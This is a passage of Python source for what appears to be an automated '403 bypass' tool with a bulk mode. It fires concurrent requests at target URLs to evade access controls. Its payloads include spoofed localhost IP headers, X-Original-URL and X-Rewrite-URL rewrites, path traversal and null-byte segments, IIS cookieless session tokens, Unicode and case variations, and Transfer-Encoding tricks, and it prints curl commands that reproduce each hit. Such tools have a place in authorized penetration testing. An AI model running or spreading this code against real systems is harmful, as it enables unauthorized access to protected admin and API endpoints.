            steps.append(f"3. cURL command:")
            steps.append(f'   curl -i "{result.bypass_url}"')

        elif result.category == "method_change":
            steps.append(f"2. Send the request using HTTP method: {result.method_used}")
            steps.append(f"3. cURL command:")
            steps.append(f'   curl -i -X {result.method_used} "{result.bypass_url}"')

        elif "iis" in result.category.lower():
            steps.append(f"2. Insert IIS cookieless session token in the URL path")
            steps.append(f"3. Bypass URL: {result.bypass_url}")
            steps.append(f"4. cURL command:")
            steps.append(f'   curl -i "{result.bypass_url}"')

        elif "unicode" in result.category.lower():
            steps.append(f"2. Replace path characters with Unicode equivalents")
            steps.append(f"3. Bypass URL: {result.bypass_url}")
            steps.append(f"4. cURL command (URL-encoded):")
            steps.append(f'   curl -i "{result.bypass_url}"')

        elif "trim" in result.category.lower():
            steps.append(f"2. Append whitespace/trim characters to the path")
            steps.append(f"3. Bypass URL: {result.bypass_url}")
            steps.append(f"4. cURL command:")
            steps.append(f'   curl -i "{result.bypass_url}"')

        else:
            steps.append(f"2. Access the bypass URL: {result.bypass_url}")
            if result.headers_used:
                header_str = ", ".join([f'"{k}: {v}"' for k, v in result.headers_used.items()])
                steps.append(f"3. With headers: {header_str}")
            steps.append(f"4. Using HTTP method: {result.method_used}")
            curl_headers = " ".join([f'-H "{k}: {v}"' for k, v in result.headers_used.items()]) if result.headers_used else ""
            steps.append(f"5. cURL command:")
            steps.append(f'   curl -i -X {result.method_used} {curl_headers} "{result.bypass_url}"')

        # Step: Expected result
        steps.append(f"")
        steps.append(f"Expected Result: HTTP {result.status_code} (was {result.original_status})")
        steps.append(f"Response Size: {result.content_length} bytes (original: {result.original_content_length} bytes)")

        if result.page_title:
            steps.append(f"Page Title: {result.page_title}")

        return steps

    async def _header_bypasses(self):
        """Try all header-based bypasses"""
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []

        # IP Spoofing headers
        for header in self.IP_HEADERS:
            for ip_value in self.IP_VALUES:
                async def try_ip_header(h=header, v=ip_value):
                    async with semaphore:
                        await self._make_request(
                            self.target_url,
                            headers={h: v},
                            technique=f"{h}: {v}",
                            category="header_ip_spoof"
                        )
                tasks.append(try_ip_header())

        # URL Rewrite headers
        for header in self.URL_HEADERS:
            for path_value in ["/", self.path, "/admin", "/api"]:
                async def try_url_header(h=header, v=path_value):
                    async with semaphore:
                        await self._make_request(
                            self.base_url + "/",
                            headers={h: v},
                            technique=f"{h}: {v}",
                            category="header_url_rewrite"
                        )
                tasks.append(try_url_header())

        # Host headers
        for header in self.HOST_HEADERS:
            for host_value in ["127.0.0.1", "localhost", self.host]:
                async def try_host_header(h=header, v=host_value):
                    async with semaphore:
                        headers = {h: v} if h != "Host" else {}
                        if h == "Host":
                            headers["Host"] = v
                        await self._make_request(
                            self.target_url,
                            headers=headers,
                            technique=f"{h}: {v}",
                            category="header_host"
                        )
                tasks.append(try_host_header())

        # Method override headers
        for method in ["GET", "PUT", "POST", "DELETE"]:
            async def try_method_override(m=method):
                async with semaphore:
                    await self._make_request(
                        self.target_url,
                        method="POST",
                        headers={"X-HTTP-Method-Override": m},
                        technique=f"X-HTTP-Method-Override: {m}",
                        category="header_method_override"
                    )
            tasks.append(try_method_override())

        # Special headers
        special_headers = [
            {"X-Requested-With": "XMLHttpRequest"},
            {"Content-Length": "0"},
            {"X-Forwarded-Proto": "https"},
            {"X-Forwarded-Port": "443"},
            {"Referer": self.target_url},
            {"Origin": self.base_url},
        ]

        for headers in special_headers:
            async def try_special(h=headers):
                async with semaphore:
                    await self._make_request(
                        self.target_url,
                        headers=h,
                        technique=str(h),
                        category="header_special"
                    )
            tasks.append(try_special())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["header_bypasses"] = len(tasks)

    async def _path_bypasses(self):
        """Try all path manipulation bypasses"""
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path.strip('/')

        for pattern in self.PATH_PATTERNS:
            # Replace placeholders
            if "{path}" in pattern:
                new_path = pattern.replace("{path}", path)
            elif "{PATH}" in pattern:
                new_path = pattern.replace("{PATH}", path.upper())
            else:
                new_path = pattern

            url = f"{self.base_url}{new_path}"

            async def try_path(u=url, p=pattern):
                async with semaphore:
                    await self._make_request(
                        u,
                        technique=p,
                        category="path_manipulation"
                    )
            tasks.append(try_path())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["path_bypasses"] = len(tasks)

    async def _method_bypasses(self):
        """Try different HTTP methods"""
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []

        for method in self.HTTP_METHODS:
            async def try_method(m=method):
                async with semaphore:
                    await self._make_request(
                        self.target_url,
                        method=m,
                        technique=f"HTTP Method: {m}",
                        category="method_change"
                    )
            tasks.append(try_method())

        # Try HTTP/1.0
        async def try_http10():
            async with semaphore:
                try:
                    connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
                    async with aiohttp.ClientSession(connector=connector) as session:
                        # Note: aiohttp doesn't directly support HTTP/1.0
                        # but we can try with close connection
                        async with session.get(
                            self.target_url,
                            headers={"Connection": "close"}
                        ) as response:
                            pass
                except:
                    pass
        tasks.append(try_http10())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["method_bypasses"] = len(tasks)

    async def _combined_bypasses(self):
        """Try combined bypass techniques"""
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path.strip('/')

        # Combine path + header
        combined_attacks = [
            # Path + IP header
            (f"{self.base_url}/%2e/{path}", {"X-Forwarded-For": "127.0.0.1"}),
            (f"{self.base_url}//{path}//", {"X-Original-URL": f"/{path}"}),
            (f"{self.base_url}/{path}%00", {"X-Rewrite-URL": f"/{path}"}),
            (f"{self.base_url}/.;/{path}", {"X-Custom-IP-Authorization": "127.0.0.1"}),

            # Different method + header
            (self.target_url, {"X-HTTP-Method-Override": "GET", "X-Forwarded-For": "127.0.0.1"}),
            (self.target_url, {"X-Original-URL": f"/{path}", "X-Forwarded-For": "127.0.0.1"}),
        ]

        for url, headers in combined_attacks:
            async def try_combined(u=url, h=headers):
                async with semaphore:
                    await self._make_request(
                        u,
                        headers=h,
                        technique=f"Combined: {h}",
                        category="combined"
                    )
            tasks.append(try_combined())

        await asyncio.gather(*tasks, return_exceptions=True)

    def _filter_results(self):
        """Filter and deduplicate successful bypasses"""
        # Remove duplicates by content hash
        seen_hashes = set()
        filtered = []

        for result in self.successful_bypasses:
            if result.content_hash not in seen_hashes:
                seen_hashes.add(result.content_hash)
                filtered.append(result)

        # Sort by confidence
        confidence_order = {"high": 0, "medium": 1, "low": 2}
        filtered.sort(key=lambda x: confidence_order.get(x.confidence, 3))

        self.successful_bypasses = filtered

    def get_bypasses_by_category(self) -> Dict[str, List[BypassResult]]:
        """Group bypasses by category"""
        categories = {}
        for result in self.successful_bypasses:
            if result.category not in categories:
                categories[result.category] = []
            categories[result.category].append(result)
        return categories

    def get_high_confidence_bypasses(self) -> List[BypassResult]:
        """Get only high confidence bypasses"""
        return [r for r in self.successful_bypasses if r.confidence == "high"]

    # ==================== ADVANCED BYPASS METHODS ====================

    async def _path_permutation_bypasses(self):
        """
        Path permutation attack - insert payloads at EVERY path segment
        Example: /api/v1/admin -> /api%2fv1/admin, /api/v1%2fadmin, etc.
        This catches cases where only part of the path is protected
        """
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []

        if not self.path_segments:
            return

        # Payloads to insert at each segment
        segment_payloads = [
            "..;",  # Semicolon traversal
            ".;",
            ";",
            "%2e%2e;",
            "..%00",  # Null byte
            "..%0d",  # Carriage return
            "..%0a",  # Line feed
            "%20",  # Space
            "%09",  # Tab
            ".",
            "./",
            "../",
            "",  # Try without segment
        ]

        # For each segment position, try inserting payloads
        for i in range(len(self.path_segments)):
            for payload in segment_payloads:
                # Insert payload BEFORE segment
                modified_segments = self.path_segments.copy()
                modified_segments[i] = payload + modified_segments[i]
                new_path = "/" + "/".join(modified_segments)

                async def try_permutation(p=new_path, pay=payload, idx=i):
                    async with semaphore:
                        await self._make_request(
                            f"{self.base_url}{p}",
                            technique=f"Path permutation: {pay} before segment {idx}",
                            category="path_permutation"
                        )
                tasks.append(try_permutation())

                # Insert payload AFTER segment
                modified_segments = self.path_segments.copy()
                modified_segments[i] = modified_segments[i] + payload
                new_path = "/" + "/".join(modified_segments)

                async def try_permutation_after(p=new_path, pay=payload, idx=i):
                    async with semaphore:
                        await self._make_request(
                            f"{self.base_url}{p}",
                            technique=f"Path permutation: {pay} after segment {idx}",
                            category="path_permutation"
                        )
                tasks.append(try_permutation_after())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["permutation_bypasses"] = len(tasks)

    async def _trim_inconsistency_bypasses(self):
        """
        Trim inconsistency bypass - exploit different whitespace handling
        between reverse proxy (Nginx) and application (Flask, Node.js, Spring)
        """
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path.strip('/')

        # Test all framework-specific trim payloads
        for framework, payloads in self.TRIM_PAYLOADS.items():
            for payload in payloads:
                # Payload at end of path
                url = f"{self.base_url}/{path}{payload}"
                async def try_trim_end(u=url, p=payload, fw=framework):
                    async with semaphore:
                        await self._make_request(
                            u,
                            technique=f"Trim inconsistency ({fw}): path + {p}",
                            category="trim_inconsistency"
                        )
                tasks.append(try_trim_end())

                # Payload at beginning of path
                url = f"{self.base_url}/{payload}{path}"
                async def try_trim_start(u=url, p=payload, fw=framework):
                    async with semaphore:
                        await self._make_request(
                            u,
                            technique=f"Trim inconsistency ({fw}): {p} + path",
                            category="trim_inconsistency"
                        )
                tasks.append(try_trim_start())

                # Payload between slashes
                url = f"{self.base_url}/{payload}/{path}"
                async def try_trim_middle(u=url, p=payload, fw=framework):
                    async with semaphore:
                        await self._make_request(
                            u,
                            technique=f"Trim inconsistency ({fw}): /{p}/path",
                            category="trim_inconsistency"
                        )
                tasks.append(try_trim_middle())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["trim_bypasses"] = len(tasks)

    async def _iis_cookieless_bypasses(self):
        """
        IIS Cookieless Session Bypass
        Exploits Microsoft IIS cookieless session feature to inject paths
        Format: /(S(sessionid))/path or /(A(anonymousid))/path
        """
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path.strip('/')

        for session_token in self.IIS_COOKIELESS:
            # Token before path
            url = f"{self.base_url}/{session_token}/{path}"
            async def try_iis(u=url, t=session_token):
                async with semaphore:
                    await self._make_request(
                        u,
                        technique=f"IIS Cookieless: {t}/path",
                        category="iis_cookieless"
                    )
            tasks.append(try_iis())

            # Token at root
            url = f"{self.base_url}/{session_token}{self.path}"
            async def try_iis_root(u=url, t=session_token):
                async with semaphore:
                    await self._make_request(
                        u,
                        technique=f"IIS Cookieless: {t}path",
                        category="iis_cookieless"
                    )
            tasks.append(try_iis_root())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["iis_bypasses"] = len(tasks)

    async def _case_sensitivity_bypasses(self):
        """
        Case sensitivity bypass - Windows servers are case-insensitive
        Try uppercase, lowercase, mixed case, and SpongeBob case
        """
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path.strip('/')

        def spongebob_case(s):
            """Convert to SpongeBob case (alternating caps)"""
            return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))

        def random_case(s):
            """Random case variation"""
            return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

        case_variations = [
            path.upper(),  # ADMIN
            path.lower(),  # admin
            path.capitalize(),  # Admin
            path.swapcase(),  # If "Admin" -> "aDMIN"
            spongebob_case(path),  # aDmIn
        ]

        # Add random case variations
        for _ in range(3):
            case_variations.append(random_case(path))

        for variation in case_variations:
            url = f"{self.base_url}/{variation}"
            async def try_case(u=url, v=variation):
                async with semaphore:
                    await self._make_request(
                        u,
                        technique=f"Case sensitivity: {v}",
                        category="case_sensitivity"
                    )
            tasks.append(try_case())

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _unicode_normalization_bypasses(self):
        """
        Unicode normalization bypass - exploit Unicode character equivalence
        Different characters that normalize to the same ASCII
        """
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path

        # Replace characters with Unicode equivalents
        for char, replacements in self.UNICODE_PAYLOADS.items():
            for replacement in replacements:
                new_path = path.replace(char, replacement)
                if new_path != path:
                    url = f"{self.base_url}{new_path}"
                    async def try_unicode(u=url, c=char, r=replacement):
                        async with semaphore:
                            await self._make_request(
                                u,
                                technique=f"Unicode normalization: {c} -> {r}",
                                category="unicode_normalization"
                            )
                    tasks.append(try_unicode())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["unicode_bypasses"] = len(tasks)

    async def _fragment_hash_bypasses(self):
        """
        Fragment/Hash bypass techniques
        Fragments (#) should be client-side only but some servers handle them
        """
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path.strip('/')

        fragment_payloads = [
            f"/{path}#",
            f"/{path}#/",
            f"/{path}#..",
            f"/{path}#/../admin",
            f"/{path}%23",
            f"/{path}%23/",
            f"/{path}%2523",  # Double encoded
            f"/{path}?#",
            f"/{path}?a=b#c",
            f"#{path}",  # Fragment at start
            f"/%23{path}",
            f"/{path}#%00",
            f"/{path}#%0a",
        ]

        for payload in fragment_payloads:
            url = f"{self.base_url}{payload}"
            async def try_fragment(u=url, p=payload):
                async with semaphore:
                    await self._make_request(
                        u,
                        technique=f"Fragment bypass: {p}",
                        category="fragment_bypass"
                    )
            tasks.append(try_fragment())

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _advanced_header_bypasses(self):
        """
        Advanced header combinations and obscure headers
        """
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path

        # Multi-header combinations
        advanced_headers = [
            # Double X-Forwarded-For
            {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "X-Client-IP": "127.0.0.1"},
            # All localhost variations
            {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost", "X-Original-URL": path},
            # Admin impersonation
            {"X-Forwarded-For": "127.0.0.1", "X-Custom-IP-Authorization": "127.0.0.1", "X-Forwarded-Proto": "https"},
            # Cloudflare bypass attempt
            {"CF-Connecting-IP": "127.0.0.1", "True-Client-IP": "127.0.0.1"},
            # AWS ALB bypass
            {"X-Forwarded-For": "127.0.0.1", "X-Amzn-Trace-Id": "Root=1-000-000"},
            # URL rewrite combinations
            {"X-Original-URL": path, "X-Rewrite-URL": path},
            {"X-Original-URL": "/", "X-Forwarded-For": "127.0.0.1"},
            # Method override combinations
            {"X-HTTP-Method-Override": "GET", "X-Method-Override": "GET", "X-HTTP-Method": "GET"},
            # Content-Type variations
            {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
            {"Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "127.0.0.1"},
            # Accept header manipulation
            {"Accept": "application/json", "X-Forwarded-For": "127.0.0.1"},
            {"Accept": "*/*", "Accept-Language": "*", "Accept-Encoding": "identity"},
            # Proxy headers
            {"Forwarded": "for=127.0.0.1;host=localhost;proto=https", "Via": "1.1 localhost"},
            # Obscure headers that might work
            {"X-Originating-IP": "[::1]"},
            {"X-Remote-Addr": "::1"},
            {"X-Backend-IP": "127.0.0.1"},
            {"X-Debug": "1", "X-Debug-Token": "bypass"},
            {"X-Frame-Options": "bypass"},
        ]

        for headers in advanced_headers:
            async def try_advanced(h=headers):
                async with semaphore:
                    await self._make_request(
                        self.target_url,
                        headers=h,
                        technique=f"Advanced headers: {list(h.keys())}",
                        category="advanced_headers"
                    )
            tasks.append(try_advanced())

            # Also try with URL rewrite headers to root
            headers_with_root = headers.copy()
            headers_with_root["X-Original-URL"] = "/"
            async def try_with_root(h=headers_with_root):
                async with semaphore:
                    await self._make_request(
                        self.base_url + "/",
                        headers=h,
                        technique=f"Advanced headers + X-Original-URL: {list(h.keys())}",
                        category="advanced_headers"
                    )
            tasks.append(try_with_root())

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _protocol_manipulation_bypasses(self):
        """
        Protocol version and connection manipulation
        """
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []

        # Connection header variations
        connection_headers = [
            {"Connection": "close"},
            {"Connection": "keep-alive"},
            {"Connection": "upgrade"},
            {"Upgrade": "websocket"},
            {"Upgrade": "h2c"},  # HTTP/2 cleartext
        ]

        for headers in connection_headers:
            async def try_connection(h=headers):
                async with semaphore:
                    await self._make_request(
                        self.target_url,
                        headers=h,
                        technique=f"Connection manipulation: {h}",
                        category="protocol_manipulation"
                    )
            tasks.append(try_connection())

        # Transfer-Encoding tricks
        te_headers = [
            {"Transfer-Encoding": "chunked"},
            {"Transfer-Encoding": "identity"},
            {"Transfer-Encoding": "chunked, identity"},
        ]

        for headers in te_headers:
            async def try_te(h=headers):
                async with semaphore:
                    await self._make_request(
                        self.target_url,
                        method="POST",
                        headers=h,
                        technique=f"Transfer-Encoding: {h}",
                        category="protocol_manipulation"
                    )
            tasks.append(try_te())

        await asyncio.gather(*tasks, return_exceptions=True)


class Bypass403Bulk:
    """
    Bulk 403 bypass for multiple URLs
    """

    def __init__(self, urls: List[str], callback: Callable = None,
                 threads: int = 20, timeout: int = 10):
        self.urls = urls
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.all_results: Dict[str, List[BypassResult]] = {}

    async def emit(self, event: str, data: dict):
        if self.callback:
            await self.callback(event, data)

    async def bypass_all(self) -> Dict[str, List[BypassResult]]:
        """Bypass all URLs"""
        await self.emit("status", {
            "message": f"Starting bulk bypass on {len(self.urls)} URLs"
        })

        semaphore = asyncio.Semaphore(self.threads)

        async def bypass_url(url: str):
            async with semaphore:
                bypasser = Bypass403(
                    url,
                    callback=self.callback,
                    threads=10,
                    timeout=self.timeout
                )
                results = await bypasser.bypass()
                self.all_results[url] = results
                return results

        tasks = [bypass_url(url) for url in self.urls]
        await asyncio.gather(*tasks, return_exceptions=True)

        await self.emit("bulk_complete", {
            "total_urls": len(self.urls),
            "successful": len([u for u, r in self.all_results.items() if r])
        })

        return self.all_results
